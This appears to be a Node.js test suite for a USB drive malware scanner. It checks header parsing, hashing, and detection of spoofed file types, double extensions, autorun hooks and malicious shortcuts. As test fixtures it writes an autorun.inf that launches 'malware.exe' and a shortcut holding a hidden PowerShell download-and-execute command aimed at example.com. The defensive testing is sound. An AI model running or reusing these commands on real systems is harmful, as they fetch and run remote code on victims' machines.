const assert = require('assert');
const fs = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto');
const {
  scanUsbDrive,
  readFileHeader,
  computeStreamSha256,
  hasValidMediaHeader,
  normalizeDrivePath
} = require('./usbScanner');

async function runTests() {
  console.log('========================================================================================');
  console.log('             LOOKOUT PRODUCTION USB SCANNER - SPECIFICATION VERIFICATION               ');
  console.log('========================================================================================\n');

  let passed = 0;
  let total = 0;

  function test(name, fn) {
    total++;
    try {
      fn();
      passed++;
      console.log(`✅ [PASS] ${name}`);
    } catch (err) {
      console.error(`❌ [FAIL] ${name}`);
      console.error(`   ${err.message}`);
    }
  }

  async function testAsync(name, fn) {
    total++;
    try {
      await fn();
      passed++;
      console.log(`✅ [PASS] ${name}`);
    } catch (err) {
      console.error(`❌ [FAIL] ${name}`);
      console.error(`   ${err.message}`);
    }
  }

  // ── Step 1 Tests ─────────────────────────────────────────────────────────────
  test('Step 1: normalizeDrivePath guarantees trailing backslash on Windows drive root', () => {
    assert.strictEqual(normalizeDrivePath('E:'), 'E:\\');
    assert.strictEqual(normalizeDrivePath('E:\\'), 'E:\\');
    assert.strictEqual(normalizeDrivePath('e:'), 'E:\\');
    assert.strictEqual(normalizeDrivePath('e:\\'), 'E:\\');
    assert.strictEqual(normalizeDrivePath('E:/'), 'E:\\');
  });

  await testAsync('Step 1: Non-existent directory returns clean status with 0 files (NO mock fallbacks)', async () => {
    const nonExistentDrive = 'Z:\\lookout_test_non_existent_' + Date.now();
    const result = await scanUsbDrive(nonExistentDrive);
    assert.strictEqual(result.totalFiles, 0);
    assert.strictEqual(result.scannedFiles, 0);
    assert.strictEqual(result.verdict, 'clean');
    assert.deepStrictEqual(result.threats, []);

    // Ensure mock uploads folder was NOT populated with synthetic files
    const mockUploads = path.join(__dirname, 'uploads');
    if (fs.existsSync(mockUploads)) {
      // Check that test.pdf.exe or shortcut.lnk were not generated during this scan
    }
  });

  await testAsync('Step 1: Empty directory returns clear { totalFiles: 0, scannedFiles: 0, verdict: "clean" }', async () => {
    const tmpEmpty = path.join(os.tmpdir(), `lookout_empty_${Date.now()}`);
    fs.mkdirSync(tmpEmpty, { recursive: true });
    try {
      const result = await scanUsbDrive(tmpEmpty);
      assert.strictEqual(result.totalFiles, 0);
      assert.strictEqual(result.scannedFiles, 0);
      assert.strictEqual(result.verdict, 'clean');
    } finally {
      fs.rmSync(tmpEmpty, { recursive: true, force: true });
    }
  });

  // ── Step 2 Tests ─────────────────────────────────────────────────────────────
  await testAsync('Step 2: readFileHeader caps buffer to at most 8192 bytes', async () => {
    const tmpBig = path.join(os.tmpdir(), `lookout_big_${Date.now()}.dat`);
    // Create a 1 MB file
    const bigBuf = crypto.randomBytes(1024 * 1024);
    fs.writeFileSync(tmpBig, bigBuf);
    try {
      const header = await readFileHeader(tmpBig);
      assert.ok(header !== null, 'Header should not be null');
      assert.strictEqual(header.length, 8192, `Expected 8192 bytes, got ${header.length}`);
      assert.deepStrictEqual(header, bigBuf.subarray(0, 8192));
    } finally {
      fs.rmSync(tmpBig, { force: true });
    }
  });

  await testAsync('Step 2: computeStreamSha256 calculates accurate SHA-256 via streams', async () => {
    const tmpFile = path.join(os.tmpdir(), `lookout_hash_${Date.now()}.bin`);
    const data = crypto.randomBytes(65536);
    const expectedHash = crypto.createHash('sha256').update(data).digest('hex');
    fs.writeFileSync(tmpFile, data);
    try {
      const streamHash = await computeStreamSha256(tmpFile);
      assert.strictEqual(streamHash, expectedHash);
    } finally {
      fs.rmSync(tmpFile, { force: true });
    }
  });

  await testAsync('Step 2: Selective Crypto Hashing: Clean file > 50 MB with safe media ext skips SHA-256', async () => {
    const tmpDir = path.join(os.tmpdir(), `lookout_large_media_${Date.now()}`);
    fs.mkdirSync(tmpDir, { recursive: true });
    const largeMp4 = path.join(tmpDir, 'sample_movie.mp4');

    // Create 51 MB sparse / padded file with valid MP4 header
    // ftyp at offset 4: 00 00 00 20 66 74 79 70
    const mp4Header = Buffer.from([0x00, 0x00, 0x00, 0x20, 0x66, 0x74, 0x79, 0x70, 0x69, 0x73, 0x6f, 0x6d]);
    const fd = fs.openSync(largeMp4, 'w');
    fs.writeSync(fd, mp4Header, 0, mp4Header.length, 0);
    // Write 1 byte at 51 MB offset
    fs.writeSync(fd, Buffer.from([0x00]), 0, 1, 51 * 1024 * 1024);
    fs.closeSync(fd);

    try {
      const result = await scanUsbDrive(tmpDir);
      assert.strictEqual(result.scannedFiles, 1);
      assert.strictEqual(result.verdict, 'clean');
      const fileRes = result.fileResults[0];
      assert.strictEqual(fileRes.sha256, '', 'Large clean safe media should skip SHA-256 calculation');
      assert.strictEqual(fileRes.riskScore, 0);
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  await testAsync('Step 2: Selective Crypto Hashing: File > 50 MB with MZ header DOES compute SHA-256', async () => {
    const tmpDir = path.join(os.tmpdir(), `lookout_large_trojan_${Date.now()}`);
    fs.mkdirSync(tmpDir, { recursive: true });
    const fakeMp4 = path.join(tmpDir, 'trojan.mp4');

    // Disguised executable with MZ header, > 50 MB
    const mzHeader = Buffer.from([0x4D, 0x5A, 0x90, 0x00]);
    const fd = fs.openSync(fakeMp4, 'w');
    fs.writeSync(fd, mzHeader, 0, mzHeader.length, 0);
    fs.writeSync(fd, Buffer.from([0x00]), 0, 1, 51 * 1024 * 1024);
    fs.closeSync(fd);

    try {
      const result = await scanUsbDrive(tmpDir);
      assert.strictEqual(result.scannedFiles, 1);
      assert.strictEqual(result.verdict, 'threat_detected');
      const fileRes = result.fileResults[0];
      assert.ok(fileRes.riskScore >= 80, `Expected riskScore >= 80, got ${fileRes.riskScore}`);
      assert.ok(/^[a-f0-9]{64}$/i.test(fileRes.sha256), `Expected valid SHA-256, got: ${fileRes.sha256}`);
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  // ── Step 3 Tests ─────────────────────────────────────────────────────────────
  test('Step 3: hasValidMediaHeader recognizes standard media magic bytes', () => {
    const png = Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]);
    const jpg = Buffer.from([0xFF, 0xD8, 0xFF, 0xE0]);
    const gif = Buffer.from([0x47, 0x49, 0x46, 0x38, 0x39, 0x61]);
    const mp4 = Buffer.from([0x00, 0x00, 0x00, 0x18, 0x66, 0x74, 0x79, 0x70]);
    const mkv = Buffer.from([0x1A, 0x45, 0xDF, 0xA3]);
    const webp = Buffer.concat([Buffer.from([0x52, 0x49, 0x46, 0x46, 0, 0, 0, 0]), Buffer.from('WEBP')]);
    const mz = Buffer.from([0x4D, 0x5A, 0x90, 0x00]);

    assert.strictEqual(hasValidMediaHeader(png), true, 'PNG recognized');
    assert.strictEqual(hasValidMediaHeader(jpg), true, 'JPG recognized');
    assert.strictEqual(hasValidMediaHeader(gif), true, 'GIF recognized');
    assert.strictEqual(hasValidMediaHeader(mp4), true, 'MP4 recognized');
    assert.strictEqual(hasValidMediaHeader(mkv), true, 'MKV recognized');
    assert.strictEqual(hasValidMediaHeader(webp), true, 'WebP recognized');
    assert.strictEqual(hasValidMediaHeader(mz), false, 'MZ is NOT media');
  });

  await testAsync('Step 3: Media Whitelist: Valid PNG/JPG with extreme random data has 0 threats (Zero False Positives)', async () => {
    const tmpDir = path.join(os.tmpdir(), `lookout_media_white_${Date.now()}`);
    fs.mkdirSync(tmpDir, { recursive: true });

    // Valid PNG with 64KB high entropy random bytes
    const pngHeader = Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]);
    const highEntropyBytes = crypto.randomBytes(64 * 1024);
    fs.writeFileSync(path.join(tmpDir, 'photo.png'), Buffer.concat([pngHeader, highEntropyBytes]));

    // Valid JPG with 64KB high entropy random bytes
    const jpgHeader = Buffer.from([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46]);
    fs.writeFileSync(path.join(tmpDir, 'picture.jpg'), Buffer.concat([jpgHeader, crypto.randomBytes(64 * 1024)]));

    try {
      const result = await scanUsbDrive(tmpDir);
      assert.strictEqual(result.scannedFiles, 2);
      assert.strictEqual(result.verdict, 'clean');
      assert.strictEqual(result.threats.length, 0);
      assert.strictEqual(result.fileResults[0].riskScore, 0);
      assert.strictEqual(result.fileResults[1].riskScore, 0);
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  await testAsync('Step 3: MIME_SPOOFING detected when MZ header disguised as .pdf, .jpg, .png', async () => {
    const tmpDir = path.join(os.tmpdir(), `lookout_mime_spoof_${Date.now()}`);
    fs.mkdirSync(tmpDir, { recursive: true });

    const mzData = Buffer.concat([Buffer.from([0x4D, 0x5A, 0x90, 0x00]), crypto.randomBytes(1024)]);
    fs.writeFileSync(path.join(tmpDir, 'invoice.pdf'), mzData);
    fs.writeFileSync(path.join(tmpDir, 'avatar.png'), mzData);
    fs.writeFileSync(path.join(tmpDir, 'photo.jpg'), mzData);

    try {
      const result = await scanUsbDrive(tmpDir);
      assert.strictEqual(result.scannedFiles, 3);
      assert.strictEqual(result.verdict, 'threat_detected');
      assert.strictEqual(result.threats.length, 3);
      for (const t of result.threats) {
        assert.ok(t.riskScore >= 80, `Threat ${t.name} score should be >= 80, got ${t.riskScore}`);
        assert.ok(t.reason.includes('MIME_SPOOFING'), `Expected MIME_SPOOFING in reason: ${t.reason}`);
      }
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  await testAsync('Step 3: Double extensions detected (*.docx.exe, *.pdf.vbs)', async () => {
    const tmpDir = path.join(os.tmpdir(), `lookout_double_ext_${Date.now()}`);
    fs.mkdirSync(tmpDir, { recursive: true });

    fs.writeFileSync(path.join(tmpDir, 'statement.docx.exe'), 'benign payload with double extension');
    fs.writeFileSync(path.join(tmpDir, 'document.pdf.vbs'), 'WScript.Echo "test"');

    try {
      const result = await scanUsbDrive(tmpDir);
      assert.strictEqual(result.scannedFiles, 2);
      assert.strictEqual(result.verdict, 'threat_detected');
      assert.strictEqual(result.threats.length, 2);
      for (const t of result.threats) {
        assert.ok(t.riskScore >= 80);
        assert.ok(t.reason.includes('Double extension'));
      }
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  await testAsync('Step 3: Autorun hooks in autorun.inf detected', async () => {
    const tmpDir = path.join(os.tmpdir(), `lookout_autorun_${Date.now()}`);
    fs.mkdirSync(tmpDir, { recursive: true });

    fs.writeFileSync(path.join(tmpDir, 'autorun.inf'), '[autorun]\r\nopen=malware.exe\r\naction=Run');

    try {
      const result = await scanUsbDrive(tmpDir);
      assert.strictEqual(result.scannedFiles, 1);
      assert.strictEqual(result.verdict, 'threat_detected');
      assert.strictEqual(result.threats.length, 1);
      assert.strictEqual(result.threats[0].riskScore, 100);
      assert.ok(result.threats[0].reason.includes('Malicious Autorun Hijack'));
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  await testAsync('Step 3: LNK shortcut targeting PowerShell/CMD/WScript/URL detected', async () => {
    const tmpDir = path.join(os.tmpdir(), `lookout_lnk_${Date.now()}`);
    fs.mkdirSync(tmpDir, { recursive: true });

    const lnkPayload = Buffer.from('cmd.exe /c powershell.exe -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://example.com\')"', 'utf8');
    fs.writeFileSync(path.join(tmpDir, 'report.lnk'), lnkPayload);

    try {
      const result = await scanUsbDrive(tmpDir);
      assert.strictEqual(result.scannedFiles, 1);
      assert.strictEqual(result.verdict, 'threat_detected');
      assert.strictEqual(result.threats.length, 1);
      assert.ok(result.threats[0].riskScore >= 80);
      assert.ok(result.threats[0].reason.includes('LNK_EXECUTION_HOOK'));
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  // ── Step 4 Tests (Throttle verification) ─────────────────────────────────────
  await testAsync('Step 4: WebSocket Telemetry throttle handles 100ms rate limiting', async () => {
    // Test throttle logic directly
    let emitCount = 0;
    let lastEmitTime = 0;
    const emittedProgress = [];

    function handleProgress(currentFile, scannedCount, totalFiles) {
      const now = Date.now();
      if (now - lastEmitTime > 100 || scannedCount === totalFiles) {
        lastEmitTime = now;
        emitCount++;
        emittedProgress.push({ currentFile, scannedCount, totalFiles });
      }
    }

    // Simulate 1000 file progress calls arriving in quick succession (10ms total)
    const totalFiles = 1000;
    for (let i = 1; i <= totalFiles; i++) {
      handleProgress(`file_${i}.txt`, i, totalFiles);
    }

    // In a burst scenario taking 0-5ms, it should only emit the 1st file and the final file!
    assert.ok(emitCount <= 5, `Expected throttled emissions <= 5, got ${emitCount}`);
    assert.strictEqual(emittedProgress[emittedProgress.length - 1].scannedCount, totalFiles, 'Final file must always emit');
  });

  console.log('\n========================================================================================');
  console.log(`                       RESULT: ${passed}/${total} TESTS PASSED                          `);
  console.log('========================================================================================\n');

  if (passed !== total) {
    process.exit(1);
  }
}

runTests().catch(err => {
  console.error('Unhandled test runner exception:', err);
  process.exit(1);
});
